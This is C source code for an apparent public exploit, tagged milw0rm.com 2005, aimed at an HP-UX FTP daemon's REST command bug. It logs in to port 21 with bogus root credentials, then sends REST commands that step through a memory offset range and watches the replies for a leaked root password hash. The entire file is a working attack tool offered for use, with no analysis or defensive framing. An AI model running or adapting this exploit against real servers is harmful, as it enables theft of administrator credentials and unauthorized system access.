/* 
Author: phased

/str0ke
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <unistd.h>

int main (int argc, char *argv[]) {

  int sock, rc;
  long int i;
  struct sockaddr_in saddr;
  struct hostent *h;
  char buf[256];

  printf("DMhpux FTPd - REST bug brute forcer\n");
  printf("by phased\n");

  if(argc < 2) {
    printf("usage: %s <host> -- simple enough?\n",argv[0]);
    exit(1);
  }
  h = gethostbyname(argv[1]);
  if(h==NULL) {
    printf("%s: unknown host '%s'\n",argv[0],argv[1]);
    exit(1);
  }

  saddr.sin_family = h->h_addrtype;
  memcpy((char *) &saddr.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
  saddr.sin_port = htons(21);

  sock = socket(AF_INET, SOCK_STREAM, 0);
  if(sock<0) {
    perror("cannot open socket ");
    exit(1);
  }

  rc = connect(sock, (struct sockaddr *) &saddr, sizeof(saddr));
  if(rc<0) {
    perror("cannot connect ");
    exit(1);
  }

  printf("Sending false login credentials\n");
 snprintf(buf, sizeof(buf), "USER root\r\n");
  printf("sending %s\n", buf);
  rc = send(sock, buf, strlen(buf), 0);
  if(rc<0) {
        perror("cannot send data ");
        close(sock);
        exit(0);
  }
  dorecv(sock);
	usleep(1000);
  memset(buf, 0, sizeof(buf));
  snprintf(buf, sizeof(buf), "PASS foo\r\n");
  printf("sending %s\n", buf);
  rc = send(sock, buf, strlen(buf), 0);
usleep(1000);
  dorecv(sock);
  dorecv(sock);

  for(i=1073931080;i<=1073945000;i = i+10) {
        snprintf(buf, sizeof(buf), "REST %d\r\n", i);
        printf("sending %s\n", buf);
        send(sock, buf, strlen(buf), 0);
        dorecv(sock);
 }


return 0;

}

int dorecv(int sock) {
char buf[256];
char *check;

memset(buf, 0, sizeof(buf));
recv(sock, buf, sizeof(buf), 0);
printf("got: %s\n", buf);
check = (char *)strstr(buf, "root");
if(check != NULL) {
        printf("Got root hash\n");
}

}

// milw0rm.com [2005-05-03]
